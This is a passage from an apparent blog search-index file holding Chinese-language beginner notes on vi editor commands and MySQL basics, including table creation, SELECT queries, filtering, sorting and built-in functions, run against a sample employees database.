在vi中查找和替换命令需要在 末行模式下 执行 格式： 1# ：%s&#x2F;&#x2F;&#x2F;g 1)全局替换 一次性替换文件中的 所有出现的旧文本 格式： 1# ：%s&#x2F;旧内容&#x2F;新内容&#x2F;g 2）可视区域替换 先选中 要替换文字的 范围 格式： 1# :s&#x2F;旧文本&#x2F;新文本&#x2F;g 3）确认替换 如果把末尾的g 改成gc 再替换的时候会有提示 是否替换 1# ：%s&#x2F;旧文本&#x2F;新文本&#x2F;gc y - yes 替换 n - no 不替换 a - all 替换所有 q - quit 退出替换 l - last 最后一个，并把光标移动到行首 ^E 向下滚屏 ^Y 向上滚屏 4.11 插入命令 编辑模式 命令 功能 常用 i 在当前字符前插入文本 常用 I 在行首插入文本 较常用 a 在当前字符后添加文本 A 在行末添加文本 较常用 o 在当前行后插入一空行 常用 O 在当前行前面插入一空行 常用 重复命令： 随便输入一个 数字， 输入 i 进入编辑模式 输入 你想要输入的内容 按ESC 返回 命令模式，返回之后会把你要输入的内容重复。 利用 可视块 给多行代码增加注释在 Python 中 ，要给代码增加注释，可以在代码前增加一个 # 要实现这个效果可以在 命令模式 下 移动到要添加注释的 第一行代码 ， 按^来到行首 按Ctrl+v 进入 可视块 模式 使用 j 向下连续选中要添加的代码行 输入 I 进入 编辑模式，并在 行首插入，注意：一定要使用I 输入 # 也就是注释号 按下 ESC 返回到 命令模式，返回之后 vi 会在之前选中的每一行代码前插入 # 0.5分屏命令5.1末行命令扩展 命令 英文 功能 :e . edit 会打开内置的文件浏览器，浏览要当前目录下的文件 :n 文件名 new 新建文件 :w 文件名 write 另存为，但是仍然编辑当前文件，并不会切换文件 *:w 命令 如果要阶段性备份的话就可以使用 : w 命令 * 切换文件之前，必须保证当前这个文件已经被保存！ 学习过的 末行命令： 命令 英文 功能 :w write 保存 :q quit 退出，如果没有保存不允许退出 :q! quit 强行退出，不保存退出 :wq write&amp;quit 保存并退出 :x 保存并退出 :%s///gc 确认搜索并替换 5.2 分屏命令 使用 分屏命令，可以 同时编辑和查看多个文件 命令 英文 功能 :sp[文件名] splip 横向增加分屏 :vsp[文件名] vertical split 纵向增加分屏 1）切换分屏窗口 分屏窗口都是基于Ctrl+W这个快捷键的，W对应的英文单词是window 命令 英文 功能 W window 切换到下一个窗口 r reverse 互换窗口 c close 关闭当前窗口，但是不能关闭最后一个窗口 q quit 退出当前窗口，如果是最后一个窗口，则关闭vi o other 关闭其他窗口","categories":[],"tags":[]},{"title":"MySQL数据库","slug":"MySQL数据库","date":"2020-04-03T06:25:27.095Z","updated":"2020-04-03T06:32:58.000Z","comments":true,"path":"2020/04/03/MySQL数据库/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"MySQL数据库优点 持久化数据到本地 可以实现结构化查询，方便管理 成本低：开源，免费使用 性能高：移植性好 体积小便于安装 数据的概念 DB 数据库(database)：存储数据的“仓库”。它保存了一系列有组织的数据。 DBMS 数据管理系统(Database Management System)。数据库是通过DBMS创建和操作的容器，又被称为数据 数据库管理系统-DBMS用于 检索数据、插入数据、更新数据、删除数据 SQL 结构化查询语言(Structure Query Language)：专门用来与数据库通信的语言 SQL的优点：1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL2、简单易学3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作数据库存储数据的特点1、将数据放到表中，表再放到库中2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。4、 表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”5、表中的数据是按行存储的，每一行类似于java中的”对象”。常见数据库管理系统MySQL、Oracle、db2、SQL server 登录和退出MySQL1234567登录指令mysql -h localhost -P 3306 -u root -p登录指令简写mysql -u root -p退出指令exit 或者 ctrl+c MySQL的常见命令其中，mysql、information_schema、performance_schema这三个库是不能随便动的 mysql（用于保存用户信息的） information_schema（用于保存原数据信息） performance_schema（用于搜集性能信息，性能参数） test（表示测试数据库，这个库里面是空的，没有表，可以在里面去新建表，可以修改库删除库） 每条命令结尾都要加分号;（非常重要）插入sql文件，也就是插入数据库1mysql&gt; source sql文件位置 查看当前所有数据库1show databases; 进入库的指令是use 库名；123#use 后面加上指定库名，这里进入的就是test库，结尾不要忘记加分号;mysql&gt; use test;Database changed #返回一个database changed表示打开了test库 查看库中的表show tables；123#查看当前库中的表用 show tablesmysql&gt; show tables;Empty set (0.00 sec) #返回结果empty set 表示空的 查看其他库的所有表show tables from 库名；12#这样也可以查看其他库的表mysql&gt; show tables from mysql; 声明：如果用use进入当前库之后，再用show tables from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里12345678910#这里use先进入的test库，虽然用show tables from查看了其他库的表，但是位置还是再test里面例如:mysql&gt; use test;Database changedmysql&gt; show tables;Empty set (0.00 sec)mysql&gt; show tables from mysql; 库里面表的内容 查看所在的库select database();1234567mysql&gt; select database();+------------+| database() |+------------+| test |+------------+1 row in set (0.00 sec) 新建数据库1mysql&gt; create database 库名; 删除数据库1mysql&gt; drop database 库名; 新建表create table 表名;12345格式：creact table 表名( 列名 列类型, 列名 列类型 ...); 12345678910111213#用create table 创建一个handsome的表，表是由列组成的，加一个id列，这个列的类型是int类型，还有一个name列，它的类型是字符串，varchar，20表示可以存储最多20个字符，也就是字符串的最大长度，varchar是可变字符串的意思mysql&gt; create table handsome( -&gt; id int, -&gt; name varchar(20));Query OK, 0 rows affected (0.02 sec)#用show tables;查看当前库中的表mysql&gt; show tables;+----------------+| Tables_in_test |+----------------+| handsome |+----------------+1 row in set (0.00 sec) 删除表1mysql&gt; drop table 表名; 查看表的结构desc 表名;123456789#用desc产看了handsome表的结构mysql&gt; desc handsome;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || name | varchar(20) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+2 rows in set (0.01 sec) 查看当前表的数据select * from 表名;123# 当前handsome表里并没有数据 mysql&gt; select * from handsome;Empty set (0.00 sec) 向表中插入数据insert into 表名() values (插入内容);123456789101112131415#mysql&gt; insert into handsome (id,name) values(1,&#39;john&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into handsome (id,name) values(2,&#39;rose&#39;);Query OK, 1 row affected (0.00 sec)# 用 select * from handsome;查看当前表的内容mysql&gt; select * from handsome;+------+------+| id | name |+------+------+| 1 | john || 2 | rose |+------+------+ 修改表中内容update 表名 set 字段=’更改内容’ where 列名=序号;12345678910111213mysql&gt; update handsome set name&#x3D;&#39;MySQL&#39; where id&#x3D;1;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0# 用select *form handsome;查看handsome表中的内容mysql&gt; select * from handsome;+------+-------+| id | name |+------+-------+| 1 | MySQL || 2 | rose |+------+-------+2 rows in set (0.00 sec) 删除表中内容delete from 表名 where 列名=序列号;1234567891011#删除handsome表中的id列中的1序列号内容，mysql&gt; delete from handsome where id&#x3D;1;Query OK, 1 row affected (0.00 sec)mysql&gt; select * from handsome;+------+------+| id | name |+------+------+| 2 | rose |+------+------+1 row in set (0.00 sec) 查看MySQL当前版本1、select version();123456789#第一种方法，用select version();查看当前版本，version是版本的意思，说明当前版本是5.5#第一种方法实在MySQL客户端上查看mysql&gt; select version();+-----------+| version() |+-----------+| 5.5.53 |+-----------+1 row in set (0.00 sec) 2、mysql -version 简写形式：mysql -V123456#退出mysql后，再当前命令行用mysql --version查看版本，版本还是5.5D:\\phpStudy\\PHPTutorial\\MySQL\\bin&gt;mysql --versionmysql Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)D:\\phpStudy\\PHPTutorial\\MySQL\\bin&gt;mysql -Vmysql Ver 14.14 Distrib 5.5.53, for Win32 (AMD64) MySQL的语法规范12345671、不区分大小写，建议关键字大写，表名、列名小写2、每条命令最好用分号结尾3、每条命令根据需要，可以进行缩进 或 换行(命令过长时，可以使用换行，如果换行，建议关键字单独一行)4、注释 单行注释:#注释文字 单行注释:-- 注释文字(注意，--后有空格) 多行注释:&#x2F;* 注释文字 *&#x2F; myemployees库四张表介绍employees表 | 员工表 列名 含义 employee_id int(6) 员工编号 first_name，varchar(20) 名 last_name， varchar(25) 姓（姓名） email，varchar(25) 邮箱 phone_number， varchar(20) 电话号码 job_id， varchar(10) 工种编号 salary， double(10,2) 月薪 commission_pct， double(4,2) 奖金率 manager_id， int(6) 上级领导的员工编号 department_id， int(4) 部门编号 hiredate， datetime 入职时间 departments表 | 部门表 列名 含义 department_id 部门编号 department_name 部门名称 manager_id 部门领导的员工编号 location_id 位置编号 locations表 | 位置表 列名 含义 location_id 位置编号 street_address 街道地址 postal_code 邮编地址 city 城市 state_province 省 country_id 国家编号 jobs表 | 职位 列名 含义 job_id 职位编号 job_title 职位名称 min_salary 最低工资 max_salary 最高工资 DQL语言基础查询（重点）语法：​ select 查询列表 from 表名; 特点：1、查询列表可以是：表中的字段，常量值、表达式、函数2、查询的结果是一个虚拟的表格1着重号&#96; &#96;位置在数字一旁边,用于区分 &#39;关键字&#39;和&#39;字段&#39;的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691、查询表中的单个字段#last_name是employees表中的字段，如果不加FROM employees会出错mysql&gt; SELECT last_name FROM employees;2、查询表中的多个字段#查询多个字段每个字段中间用&#39;,&#39;逗号隔开mysql&gt; SELECT last_name,salary,email FROM employees;3、查询表中所有字段#查询employees所有字段mysql&gt; SELECT * FROM employees;还有一种方法，像第二步一样，将所有字段都打上，然后查询。4、查询常量值#100只是一个普通的常量值，并不是来自某个表所以不需要加FROMmysql&gt; SELECT 100; #还会返回结果，只不过它显示的字段名就是它本身+-----+| 100 |+-----+| 100 |+-----+查询字符型常量值# MySQL中是不区分字符和字符串的，只要是字符都认为是字符型mysql&gt; SELECT &#39;jock&#39;;+------+| jock |+------+| jock |+------+注意:字符型和日期型的常量值必须用引号引起来，数值型不需要5、查询表达式# 用SELECT 计算表达式也是可以的(+、-、*、&#x2F;、%...)算数运算符都可以用mysql&gt; SELECT 100*98;+--------+| 100*98 |+--------+| 9800 |+--------+6、查询函数# 函数最关键的标志就是&#39;()&#39;小括号，之前的VERSION()就是一个函数# 查看版本号mysql&gt; SELECT VERSION();+-----------+| VERSION() |+-----------+| 5.5.53 |+-----------+7、为字段起别名优点： 便于理解，提高可读性 如果要查询的字段有重名情况，使用别名可以区分。方式一：使用AS#格式 SELECT 内容(列表) AS 名称(别名)mysql&gt; SELECT 100%98 AS 结果;+------+| 结果 |+------+| 2 |+------+1 row in set (0.00 sec)# 将employees数据库中的last_name 和 first_name 分别起名 &#39;姓&#39;和&#39;名&#39;mysql&gt; SELECT last_name AS 姓,first_name AS 名 FROM employees;+-------------+-------------+| 姓 | 名 |+-------------+-------------+| K_ing | Steven |方式二：使用空格，不需要使用ASmysql&gt; SELECT last_name 姓,first_name 名 FROM employees;+-------------+-------------+| 姓 | 名 |+-------------+-------------+| K_ing | Steven |特殊情况 案例：给last_name起一个别名out put #如果这样运行会报错，因为中间有特殊符号 &#39;空格&#39;，MySQL不理解当前内容 mysql&gt; SELECT last_name AS out put from employees; 修改： #将有特殊符号的别名用(&quot;&quot;)双引号引起来，当然，这里着重号(&#39;&#39;)也是可以的。 mysql&gt; SELECT last_name AS &quot;out put&quot; from employees; 8、去重 distinct语法： SELECT DISTINCT 字段名 FROM 表名;案例：查询员工表中涉及到的所有部门编号# 其中有很多重复的编号mysql&gt; SELECT department_id FROM employees;+---------------+| department_id |+---------------+| NULL || 10 || 20 || 20 || 30 || 30 |# 这样就将重复的数字去除了mysql&gt; select distinct department_id from employees;+---------------+| department_id |+---------------+| NULL || 10 || 20 || 30 || 40 |注意:去重不能用于多个字段，只能用于单字段9、+号的作用在其他编程语言中+号是运算符，也是拼接符，而在MySQL中+号： 只有一个功能:运算符select 100+90; 两个操作数都是数值时，则做加法运算select &#39;123&#39;+90; 只要其中一方为字符型，试图将字符型转换成数值型 如果转换成功，则继续做加法运算select &#39;john&#39;+90; 如果转换失败，则将字符型数值转换成0select null+90; 只要其中一方为null，则结果肯定为null案例：查询员工名和姓连接成一个字段，并显示为 姓名#虽然没报错，但是输出结果全是0，原因是+号和我们想象的不一样，这里并不是拼接的意思 mysql&gt; SELECT last_name+first_name AS 姓名 FROM employees;+------+| 姓名 |+------+| 0 | 【补充】concat函数在MySQL中做拼接就不能用+号了而是用到一个函数CONCAT函数mysql&gt; SELECT CONCAT(last_name,first_name) AS 姓名 FROM employees;+------------------+| 姓名 |+------------------+| K_ingSteven |【补充】ifnull函数IFNULL()函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回指定的值，如果不为 NULL 则返回原来的的值# 用IFNULL判断时候为null，结果为null返回0，不为null返回本身mysql&gt; SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,IFNULL(commission_pct,0)) AS out_put FROM employees;+------------------------+| out_put |+------------------------+| Steven,K_ing,0.00 || Neena,Kochhar,0.00 || John,Russell,0.40 |【补充】isnull函数判断某字段表达式是否为null，如果是，则返回1，否则返回0SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,ISNULL(commission_pct,0)) AS out_put FROM employees; 条件查询12345678&lt;&gt;和!&#x3D;都是不等于的意思语法： SELECT 查询列表 FROM 表名 WHERE 筛选条件; #这里的where可以理解为if的意思 分类: 一、按条件表达式筛选(条件运算符):&gt;、&lt;、&#x3D;、&lt;&gt;(!&#x3D;)、&gt;&#x3D;、&lt;&#x3D; #其中&lt;&gt;表示不等于，也可以用!&#x3D; 二、按逻辑表达式筛选(逻辑运算符):and、or、not 三、模糊查询:like、between and、in、is null 1、按条件表达式筛选1234案例一:查询工资&gt;12000的员工信息mysql&gt; SELECT * FROM employees WHERE salary&gt;12000; 案例二:查询部门编号不等于90号的员工名和部门编号mysql&gt; SELECT last_name,department_id FROM employees WHERE department_id&lt;&gt;90; 2、按逻辑表达式筛选1234567891011121314151617案例一:查询工资在1w到2w之间的员工名、工资、以及奖金mysql&gt; SELECT -&gt; last_name,salary,commission_pct -&gt; FROM -&gt; employees -&gt; WHERE -&gt; salary&gt;&#x3D;10000 AND salary&lt;&#x3D;20000; 案例一:查询部门编号不是在90到110之间，或者工资高于15000的员工信息 SELECT -&gt; department_id,salary -&gt; FROM -&gt; employees -&gt; WHERE -&gt; department_id&lt;90 AND department_id&gt;110 OR salary&lt;15000; #还有一种是 -&gt; NOT(department_id&gt;&#x3D;90 AND department_id&lt;&#x3D;110) OR salary&lt;15000; 模糊查询一、like特点: 一般和通配符搭配使用 通配符: % 任意多个字符，包含0个字符 _ 任意单个字符 123456789101112131415161718192021222324252627282930 案例一:查询员工名中包含字符a的员工信息#a是字符用引号引起，%代表通配符mysql&gt; SELECT * FROM employees WHERE last_name like &#39;%a%&#39;;案例二:查询员工名中第三个字符为n，第五个字符为l的员工名和工资mysql&gt; SELECT salary,last_name FROM employees WHERE last_name LIKE &#39;__n_l%&#39;;+---------+-----------+| salary | last_name |+---------+-----------+| 9000.00 | Hunold |+---------+-----------+1 row in set (0.00 sec)案例三:查询员工名中第二个字符为下划线的 #可以用反斜杠转义mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_\\_%&#39;;+-----------+| last_name |+-----------+| K_ing || K_ing |+-----------+escape方法#可以不用反斜杠使用任意字符，然后再后面加一个 ESCAPE关键字，将之前的字符引起来就可以mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_^_%&#39; ESCAPE &#39;^&#39;; 二、between and1、使用between and 可以提高语句的简洁度 2、包含临界值 3、两个临界值不能调换顺序 12345678案例1:查询员工编号100到120之间的员工信息#这样就不需要像之前用and一样，每个数值前都需要加上字段名现在:mysql&gt; SELECT employee_id FROM employees WHERE employee_id BETWEEN 100 AND 120;#之前:mysql&gt; SELECT employee_id FROM employees WHERE employee_id&gt;&#x3D;100 AND employee_id&lt;&#x3D;120;not between andmysql&gt; SELECT last_name,salary FROM employees WHERE salary NOT BETWEEN 8000 and 17000 三、in含义:判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or特点:1、使用in提高了语句的简洁度2、in列表的值类型必须统一或者兼容3、in列表不支持通配符1234案例:查询员工的工种编号是 IT_PROG、AD_VP中的一个员工名和工种编号现在:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id IN (&#39;IT_PROG&#39;,&#39;AD_VP&#39;);之前:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id&#x3D;&#39;IT_PROG&#39; OR job_id&#x3D;&#39;AD_VP&#39;; 四、is null= 或者 &lt;&gt; 不能用于判断null值is null 或 is not null 可以判断null值1234案例一:查询没有奖金的员工名和奖金率mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NULL;查询有奖金的:mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NOT NULL; 安全等于 &lt;=&gt;是判断是否等于， 12345案例一:查询没有奖金的员工名和奖金率mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct &lt;&#x3D;&gt; NULL;案例二:查询工资12000的员工信息mysql&gt; SELECT last_name,salary FROM employees WHERE salary &lt;&#x3D;&gt; 12000; 排序查询123456789101112131415161718192021222324252627282930提点: 1、ASC是升序 DESC是降序，如果不写，默认是升序 2、order by子句中可以支持单个字段、多个字段、表达式、函数、别名 3、order by子句一般是放在查询语句的最后面，limit语句除外 语法一: SELECT 查询列表 FROM 表 【WHERE 筛选条件】 ORDER BY 排序列表 |【ASC | DESC】案例:查询员工信息，要求工资从高到低排序 | 从低到高只需要把DESC修改成ASC就可以mysql&gt; SELECT * FROM employees WHERE salary ORDER BY salary DESC;案例二:查询部门编号&gt;&#x3D;90的员工信息,按入职时间的先后进行排序【添加筛选条件】mysql&gt; SELECT department_id,hiredate FROM employees WHERE department_id&gt;&#x3D;90 ORDER BY hiredate ASC;案例三:按年薪的高低显示员工的信息和年薪【按表达式排序】mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪 -&gt; FROM employees -&gt; ORDER BY salary*12*(1+IFNULL(commission_pct,0)) DESC; 案例四:按年薪的高低显示员工的信息和年薪【按别名排序】mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪 -&gt; FROM employees -&gt; ORDER BY 年薪 DESC; 案例五:按姓名的长度显示员工的姓名和工资【按函数排序】lenth()函数可以显示字符长度mysql&gt; SELECT LENGTH(last_name) 字节长度,last_name,salary FROM employees ORDER BY LENGTH(last_name);案例六:查询员工信息，要求先按照员工工资排序，再按员工编号排序【按多个字段排序】mysql&gt; SELECT * FROM employees ORDER BY salary ASC,employee_id DESC; 常见函数概念:将一组逻辑语句封装在方法体中，对外暴露方法名好处:1、隐藏了函数实现细节 2、提高了代码的重用性调用: select 函数名(实参列表) 【form 表】;特点:函数名函数功能分类:1、单行函数如: concat、length、ifnull等2、分组函数功能：做统计使用，又称为统计函数、聚合函数、组函数单行函数单行函数: 字符函数 数学函数 日期函数 其他函数【补充】 流程控制函数【补充】 12345678910111213141516171819202122232425262728293031323334353637383940414243单行函数总结: 字符函数: length (获取字节长度) concat(拼接字符) upper(将字母大写) lower(将字母小写) substr(索引) instr(返回第一次索引的位置) trim(去除开头和结尾) lpad(用指定字符实现左填充) rpad(用指定字符实现右填充) replace(替换)数学函数: round(四舍五入) ceil(向上取整) floor(向下取整) truncate(截断) mod(取余) rand(获取随机数)，返回0-1之间的小数，无限接近于1但到不了1日期函数: now(返回当前日期和时间) curdate(返回当前日期) curtime(返回当前时间) year(年) month(月) day(日) hour(小时) minute(分钟) second(秒) str_to_date(将字符通过指定的格式转换成日期) date_format(将日期转换成字符) ditediff(两个日期相差的天数) monthname(以英文形式返回月)其他函数: version(查看当前系统版本) datebase(查看当前库名) user(查看当前用户) password(&#39;字符&#39;):返回该字符的密码形式，也就是自动加密 md5(&#39;字符&#39;):返回md5加密形式流程控制函数： if(类似于if else) case(类似于 swith default) 一、字符函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811、length 获取参数值的字节个数mysql&gt; SELECT LENGTH(&#39;john&#39;);2、concat 拼接字符串mysql&gt; SELECT CONCAT(last_name,&#39;_&#39;,first_name) FROM employees;3、upper、lower upper将想写变成大写，lower是将大写变成小写mysql&gt; SELECT UPPER(&#39;joke&#39;);mysql&gt; SELECT LOWER(&#39;jokE&#39;);示例:将姓大写，名小写，然后拼接mysql&gt; SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;4、substr、substring 索引注意:索引是从1开始的，截取指定索引处后面所有的字符mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;,5) out_put;截取从指定索引处指定字符长度的字符mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;，1,4) out_put;案例:姓名中首字符大写，其他字符小写，然后用_拼接，显示出来mysql&gt; SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),&#39;_&#39;,LOWER(SUBSTR(last_name,2))) out_put FROM employees;5、instr 返回子串第一次出现的索引，如果找不到返回0mysql&gt; SELECT INSTR(&#39;杨过和小龙女&#39;,&#39;小龙女&#39;) out_put;+---------+| out_put |+---------+| 4 |+---------+6、trim注意:trim只能去除开头和结尾，中间不能去除mysql&gt; SELECT TRIM(&#39; 皮卡丘 &#39;) out_put;+---------+| out_put |+---------+| 皮卡丘 |+---------+#可以加上length来查看字符长度，看看是否将空格去除了mysql&gt; SELECT LENGTH(TRIM(&#39; 皮卡丘 &#39;)) out_put;+---------+| out_put |+---------+| 6 |+---------+案例一、aaaaaaa皮卡丘aaaaaaaa将a去除，只显示皮卡丘# 只需要在前面加上你想要去掉的符号就可以mysql&gt; SELECT TRIM(&#39;a&#39; FROM &#39;aaaaaaa皮卡丘aaaaaaaa&#39;) out_put;+---------+| out_put |+---------+| 皮卡丘 |+---------+7、lpad 用指定字符实现左填充指定长度mysql&gt; SELECT LPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;+--------------+| out_put |+--------------+| ********小智 |+--------------+8、rpad 用指定字符实现右填充指定长度mysql&gt; SELECT RPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;+--------------+| out_put |+--------------+| 小智******** |+--------------+9、replace 替换#将周芷若替换成了赵敏mysql&gt; SELECT REPLACE(&#39;张无忌爱上了周芷若&#39;,&#39;周芷若&#39;,&#39;赵敏&#39;) AS out_put;+------------------+| out_put |+------------------+| 张无忌爱上了赵敏 |+------------------+ 二、数学函数12345678910111213141516171819202122232425262728293031323334351、round 四舍五入mysql&gt; SELECT ROUND(4.6) number;2、ceil 向上取整，返回&gt;&#x3D;该参数的最小整数mysql&gt; SELECT CEIL(1.0000002) AS number;+--------+| number |+--------+| 2 |+--------+3、floor 向下取整，返回&lt;&#x3D;该参数的最大整数mysql&gt; SELECT FLOOR(1.0000002) AS number;+--------+| number |+--------+| 1 |+--------+4、truncate 截断# 4 表示保留小数点后几位mysql&gt; SELECT TRUNCATE(3.1415926,4) AS number;+--------+| number |+--------+| 3.1415 |+--------+5、mod 取余mysql&gt; SELECT MOD(10,8) AS number;+--------+| number |+--------+| 2 |+--------+ 三、日期函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667681、now 返回当前系统+日期mysql&gt; SELECT NOW();+---------------------+| NOW() |+---------------------+| 2020-02-05 15:09:28 |+---------------------+2、curdate 放回当前系统日期，不包含时间mysql&gt; SELECT CURDATE();+------------+| CURDATE() |+------------+| 2020-02-05 |+------------+3、curtime 返回当前系统时间，不包含日期mysql&gt; SELECT CURTIME();+-----------+| CURTIME() |+-----------+| 15:21:07 |+-----------+4、可以获取指定的部分，年、月、日、小时、分钟、秒# 年(year)、月(month)、日(day)、小时(hour)、分钟(Minute)、秒(second)mysql&gt; SELECT YEAR(NOW());+-------------+| YEAR(NOW()) |+-------------+| 2020 |+-------------+5、str_to_date 将字符通过指定的格式转换成日期mysql&gt; SELECT STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;);+-------------------------------------+| STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;) |+-------------------------------------+| 2020-02-23 |+-------------------------------------+案例一:查询入职时间为1992-4-3的员工信息mysql&gt; SELECT hiredate FROM employees WHERE hiredate &#x3D; STR_TO_DATE(&#39;4-3-1992&#39;,&#39;%c-%d-%Y&#39;);+---------------------+| hiredate |+---------------------+| 1992-04-03 00:00:00 || 1992-04-03 00:00:00 || 1992-04-03 00:00:00 || 1992-04-03 00:00:00 || 1992-04-03 00:00:00 |+---------------------+date_format:将日期转换成字符mysql&gt; SELECT DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;);+----------------------------------------+| DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;) |+----------------------------------------+| 2020年02月05日 |+----------------------------------------+案例一:查询有奖金的员工名和入职日期(××月&#x2F;××日 ××年)mysql&gt; SELECT last_name,DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;) FROM employees WHERE commission_pct IS NOT NULL;+------------+---------------------------------------+| last_name | DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;) |+------------+---------------------------------------+| Russell | 12月23日 02年 || Partners | 12月23日 02年 | 四、其他函数123select version(); 查看当前版本select datebase(); 查看当前数据库select user(); 代表当前用户 五、流程控制函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374751、if函数: 类似于 if else 的效果#括号里面的数值，第一个是条件表达式，如果条件成立输出第二个，如果不成立，输出第三个10&gt;2成立，输出 大 mysql&gt; select if(10&gt;2,&#39;大&#39;,&#39;小&#39;);# 10&lt;2条件不成立，输出 小mysql&gt; select if(10&lt;2,&#39;大&#39;,&#39;小&#39;);案例一:将有奖金的员工名打印有，没有奖金的打印无mysql&gt; select last_name,commission_pct,if(commission_pct is null,&#39;无&#39;,&#39;有&#39;) 奖金 from employees;2、case函数的使用方法一 大部分用于等值判断在when中值不需要加;分号，语句需要加;分号&#x2F;*语法: case 要判断的字段或表达式 when 常量1 then 要显示的值1或语句1; when 常量2 then 要显示的值2或语句2; ... else 要显示的值n或语句n; end*&#x2F;案例:查询员工的工资，要求:部门号&#x3D;30，显示工资1.1倍部门号&#x3D;40，显示工资1.2倍部门号&#x3D;50，显示工资1.3倍其他部门，显示工资为原工资mysql&gt; select salary,department_id, -&gt; case department_id -&gt; when 30 then salary*1.1 -&gt; when 40 then salary*1.2 -&gt; when 50 then salary*1.3 -&gt; else salary -&gt; end as 新工资 -&gt; from employees;+----------+---------------+----------+| salary | department_id | 新工资 |+----------+---------------+----------+| 24000.00 | 90 | 24000.00 || 17000.00 | 90 | 17000.00 || 17000.00 | 90 | 17000.00 || 9000.00 | 60 | 9000.00 || 6000.00 | 60 | 6000.00 |3、case 函数的使用二 大部分用于判断大于小于&#x2F;*语法: case when 条件1 then 要显示的值1 when 条件2 then 要显示的值2 ... else 要显示的值n或语句n; end*&#x2F;案例一:查询员工的工资情况如果工资&gt;20000,显示A级别如果工资&gt;15000,显示B级别如果工资&gt;10000,显示C级别其他显示D级别mysql&gt; select salary, -&gt; case -&gt; when salary&gt;20000 then &#39;A&#39; -&gt; when salary&gt;15000 then &#39;B&#39; -&gt; when salary&gt;10000 then &#39;C&#39; -&gt; else &#39;D&#39; -&gt; end as 工资级别 -&gt; from employees;+----------+----------+| salary | 工资级别 |+----------+----------+| 24000.00 | A || 17000.00 | B || 9000.00 | D || 12000.00 | C | 分组函数功能:用作统计使用，又成为聚合函数或统计函数或组函数分类:sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数特点:1、sum、avg 一般用于处理数值型max、min、count可以处理任何类型2、以上分组函数都忽略null值3、可以和distinct搭配是去重运算 select sum(distinct 字段) from 表4、count函数的单独介绍，一般使用count()用作统计行数5、和分组函数一同查询的字段要求是group by后的字段123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657581、简单的使用mysql&gt; select sum(salary) from employees; #salary的全部和mysql&gt; select avg(salary) from employees; #salary的平均值mysql&gt; select max(salary) from employees; #salary的最大值mysql&gt; select min(salary) from employees; #salary的最小值mysql&gt; select count(salary) from employees; #计算有多少个salary可以将函数一起使用mysql&gt; select sum(salary) 和,avg(salary) 平均,max(salary) 最大,min(salary) 最小,count(salary) 个数 from employees;2、参数支持那些类型sum、avg一般用于处理数值型max、min、count可以处理任何类型 mysql&gt; select sum(salary),avg(salary) from employees;mysql&gt; select max(last_name),min(salary),count(last_name) from employees;3、是否忽略null值以上分组函数都忽略null值mysql&gt; select sum(commission_pct),avg(commission_pct) from employees;mysql&gt; select max(commission_pct),min(commission_pct) from employees;mysql&gt; select count(commission_pct) from employees;4、和distinct的搭配其他分组函数全都支持distinct去重mysql&gt; select sum(distinct salary),sum(salary) from employees;+----------------------+-------------+| sum(distinct salary) | sum(salary) |+----------------------+-------------+| 397900.00 | 691400.00 |+----------------------+-------------+计算有几个工资，去重之后是57个原始的个数是107个mysql&gt; select count(distinct salary),count(salary) from employees;+------------------------+---------------+| count(distinct salary) | count(salary) |+------------------------+---------------+| 57 | 107 |+------------------------+---------------+5、count函数详细介绍#统计行数也就是个数mysql&gt; select count(*) from 